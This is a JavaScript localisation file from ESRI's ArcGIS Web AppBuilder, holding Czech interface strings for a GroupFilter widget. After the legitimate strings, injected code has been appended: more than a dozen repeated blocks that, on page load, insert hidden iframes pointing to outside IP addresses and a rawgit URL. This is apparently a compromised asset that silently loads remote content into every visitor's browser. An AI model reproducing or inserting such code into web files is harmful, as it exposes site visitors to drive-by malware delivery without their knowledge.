// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/GroupFilter/setting/nls/strings":{configText:"N\u00ed\u017ee definujte skupiny filtr\u016f",labels:{groupName:"N\u00e1zev sady filtr\u016f:",groupNameTip:"N\u00e1zev filtru, ze kter\u00e9ho bude u\u017eivatel vyb\u00edrat.",groupDesc:"Popis:",groupDescTip:"Popis sady filtr\u016f",groupOperator:"P\u0159ednastaven\u00fd oper\u00e1tor:",groupOperatorTip:"Mo\u017enost p\u0159eddefinovat oper\u00e1tor filtru. Pokud nen\u00ed vybr\u00e1n p\u0159ednastaven\u00fd oper\u00e1tor, pou\u017eije filtr oper\u00e1tor rovn\u00e1 se.",
groupDefault:"P\u0159ednastaven\u00e1 hodnota:",groupDefaultTip:"Mo\u017enost vybrat hodnotu z existuj\u00edc\u00ed vrstvy",sameLayerAppend:"Kdy\u017e je filtr uveden v\u00edce ne\u017e jednou, pou\u017eije se mezi poli n\u00e1sleduj\u00edc\u00ed oper\u00e1tor:",sameLayerConjunc:"P\u0159ipojit pomoc\u00ed:"},buttons:{addNewGroup:"P\u0159idejte novou skupinu",addNewGroupTip:"P\u0159id\u00e1 novou sadu filtr\u016f.",addLayer:"P\u0159idat vrstvu",addLayerTip:"P\u0159id\u00e1 do sady filtr\u016f vrstvu."},
inputs:{groupName:"Pojmenujte svou skupinu",groupDesc:"Popis va\u0161\u00ed skupiny",groupDefault:"Zadejte p\u0159eddefinovanou hodnotu",simpleMode:"Spustit v\u00a0jednoduch\u00e9m zobrazen\u00ed",simpleModeTip:"Mo\u017enost zjednodu\u0161it nakonfigurovan\u00e9 rozhran\u00ed widgetu. Kdy\u017e je za\u0161krtnuta, odstran\u00ed se z rozhran\u00ed rozbalovac\u00ed seznam oper\u00e1tor\u016f a tla\u010d\u00edtka pro p\u0159id\u00e1n\u00ed krit\u00e9ri\u00ed.",webmapAppendMode:"P\u0159ipojit filtr k existuj\u00edc\u00edmu filtru webov\u00e9 mapy pomoc\u00ed ",
webmapAppendModeTip:"Mo\u017enost p\u0159ipojit sadu filtr\u016f k existuj\u00edc\u00edmu filtru webov\u00e9 mapy. Podporovan\u00e9 oper\u00e1tory jsou OR a AND.",persistOnClose:"Zachovat po zav\u0159en\u00ed widgetu",optionsMode:"Skr\u00fdt mo\u017enosti widgetu",optionsModeTip:"Mo\u017enost zobrazit dal\u0161\u00ed nastaven\u00ed widget\u016f. Pokud je za\u0161krtnuta, bude z rozhran\u00ed odstran\u011bna a zak\u00e1z\u00e1na mo\u017enost ukl\u00e1d\u00e1n\u00ed a na\u010d\u00edt\u00e1n\u00ed definovan\u00fdch filtr\u016f a zachov\u00e1n\u00ed filtru po zav\u0159en\u00ed widgetu.",
optionOR:"'NEBO'",optionAND:"A",optionEQUAL:"JE ROVNO",optionNOTEQUAL:"NEN\u00cd ROVNO",optionGREATERTHAN:"V\u011aT\u0160\u00cd NE\u017d",optionGREATERTHANEQUAL:"V\u011aT\u0160\u00cd NE\u017d NEBO ROVNO",optionLESSTHAN:"MEN\u0160\u00cd NE\u017d",optionLESSTHANEQUAL:"MEN\u0160\u00cd NE\u017d NEBO ROVNO",optionSTART:"ZA\u010c\u00cdN\u00c1 NA",optionEND:"KON\u010c\u00cd NA",optionLIKE:"OBSAHUJE",optionNOTLIKE:"NEOBSAHUJE",optionONORBEFORE:"JE V\u00a0TERM\u00cdNU NEBO P\u0158ED",optionONORAFTER:"JE V\u00a0TERM\u00cdNU NEBO PO",
optionNONE:"\u017d\u00e1dn\u00fd"},tables:{layer:"Vrstvy",layerTip:"N\u00e1zev vrstvy podle definice v map\u011b",field:"Pole",fieldTip:"Pole, podle kter\u00e9ho bude vrstva filtrov\u00e1na.",value:"Pou\u017e\u00edvat hodnotu",valueTip:"Mo\u017enost pou\u017e\u00edt rozbalovac\u00ed seznam hodnot z vrstvy. Pokud tento parametr nepou\u017e\u00edv\u00e1 \u017e\u00e1dn\u00e1 vrstva, zobraz\u00ed se u\u017eivateli pole prost\u00e9ho textu.",zoom:"Zv\u011bt\u0161en\u00ed",zoomTip:"Mo\u017enost p\u0159ibl\u00ed\u017eit zobrazen\u00ed na rozsah prvk\u016f po aplikaci filtru. Lze vybrat pouze jednu vrstvu, na kterou bude zobrazen\u00ed p\u0159ibl\u00ed\u017eeno.",
action:"Smazat (Delete)",actionTip:"Odstran\u00ed vrstvu ze sady filtr\u016f."},popup:{label:"Vyberte hodnotu"},errors:{noGroups:"Je nutn\u00e9 m\u00edt alespo\u0148 jednu skupiny.",noGroupName:"Chyb\u00ed jeden nebo v\u00edce n\u00e1zv\u016f skupin.",noDuplicates:"Jeden nebo v\u00edce n\u00e1zv\u016f skupin se opakuj\u00ed.",noRows:"Tabulka mus\u00ed obsahovat alespo\u0148 jeden \u0159\u00e1dek.",noLayers:"Mapa neobsahuje vrstvy."},picker:{description:"Pou\u017eijte tento formul\u00e1\u0159 k nalezen\u00ed p\u0159ednastaven\u00e9 hodnoty pro tuto skupinu.",
layer:"Vyberte vrstvu",layerTip:"N\u00e1zev vrstvy podle definice ve webov\u00e9 map\u011b",field:"Vyberte pole",fieldTip:"Pole, ze kter\u00e9ho bude nastavena p\u0159ednastaven\u00e1 hodnota.",value:"Vyberte hodnotu",valueTip:"Hodnota, kter\u00e1 bude u widgetu v\u00fdchoz\u00ed."},_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});